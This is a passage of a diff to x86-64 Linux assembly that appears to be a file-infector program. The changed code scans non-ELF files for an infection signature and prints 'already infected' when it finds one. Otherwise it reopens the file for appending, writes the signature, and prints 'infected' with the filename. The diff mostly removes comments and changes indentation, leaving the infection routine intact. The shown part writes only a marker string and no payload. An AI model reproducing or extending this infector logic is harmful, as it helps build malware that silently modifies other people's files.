-    jle .process_close_and_append  ; if bytes_read <= 0, not found
+    jle .process_close_and_append
 
-    mov rbx, rax                ; rbx = bytes_read
+    mov rbx, rax
 
-    ; Search for signature in the buffer
-    lea rdi, [rel sig_check_buf]  ; buffer to search in
-    mov rsi, rbx                  ; buffer length
-    lea rdx, [rel signature]      ; signature to search for
-    mov rcx, signature_len        ; signature length
+    lea rdi, [rel sig_check_buf]
+    mov rsi, rbx
+    lea rdx, [rel signature]
+    mov rcx, signature_len
     call search_substring
 
-    ; If found (rax == 1), file is already infected
     test rax, rax
     jnz .process_already_infected
 
-    ; Calculate overlap for next read (in case signature spans chunks)
-    ; Seek back by (signature_len - 1) bytes to handle boundary cases
-    add r15, rbx                ; update position
-    cmp r15, r14                ; check if we've read the whole file
+    add r15, rbx
+    cmp r15, r14
     jge .process_close_and_append
 
-    ; Seek back slightly to handle signatures that span chunk boundaries
-    ; Calculate new position: max(0, r15 - signature_len + 1)
     mov rsi, r15
-    sub rsi, signature_len      ; go back by signature length
-    add rsi, 1                  ; but keep 1 byte of progress
-    
-    ; Check for negative offset (shouldn't happen but be safe)
+    sub rsi, signature_len
+    add rsi, 1
     test rsi, rsi
     js .process_close_and_append
-    
+
     mov eax, SYS_LSEEK
-    mov edi, r13d               ; fd
-    xor edx, edx                ; SEEK_SET = 0
+    mov edi, r13d
+    xor edx, edx
     syscall
 
-    ; Check if lseek failed
     test rax, rax
     js .process_close_and_append
 
-    mov r15, rax                ; update position to new seek position
+    mov r15, rax
     jmp .process_sig_read_loop
 
 .process_already_infected:
-    ; Close the file
     mov eax, SYS_CLOSE
     mov edi, r13d
     syscall
 
-    ; Print "already infected"
     lea rdi, [rel msg_already_infected]
     call print_string
     jmp .process_done
 
 .process_close_and_append:
-    ; Close the file
     mov eax, SYS_CLOSE
     mov edi, r13d
     syscall
 
-    ; Reopen file for appending (O_WRONLY | O_APPEND)
     mov eax, SYS_OPENAT
     mov edi, AT_FDCWD
-    mov rsi, r12                ; pathname
-    mov edx, O_WRONLY | O_APPEND  ; flags: write + append
+    mov rsi, r12
+    mov edx, O_WRONLY | O_APPEND
     xor r10d, r10d
     syscall
 
-    ; Check if open failed
     test rax, rax
-    js .process_done            ; if fd < 0, just return
+    js .process_done
 
-    mov r13, rax                ; r13 = fd
+    mov r13, rax
 
-    ; Write the signature to the file
     mov eax, SYS_WRITE
-    mov edi, r13d               ; fd
-    lea rsi, [rel signature]    ; signature string
-    mov edx, signature_len      ; length of signature
+    mov edi, r13d
+    lea rsi, [rel signature]
+    mov edx, signature_len
     syscall
 
-    ; Check if write failed
     test rax, rax
-    js .process_write_failed    ; if write failed, close and return
+    js .process_write_failed
 
-    ; Close the file
     mov eax, SYS_CLOSE
     mov edi, r13d
     syscall
 
-    ; Print "infected " + filename + newline
     lea rdi, [rel msg_infected]
     call print_string
-    mov rdi, r12                ; filename
+    mov rdi, r12
     call print_string
-    ; Print newline
     mov eax, SYS_WRITE
     mov edi, STDOUT
     lea rsi, [rel newline]
@@ -432,7 +1049,6 @@ process_non_elf_file:
     jmp .process_done
 
 .process_write_failed:
-    ; Close the file on write failure
     mov eax, SYS_CLOSE
     mov edi, r13d
     syscall
@@ -449,8 +1065,8 @@ process_non_elf_file:
 
 
 _end:
-  mov rdi, the_end
-  call print_string
-  mov eax, 60                 ; sys_exit
-  xor edi, edi                ; status = 0
-  syscall
+    mov rdi, the_end
+    call print_string
+    mov eax, 60
+    xor edi, edi
+    syscall
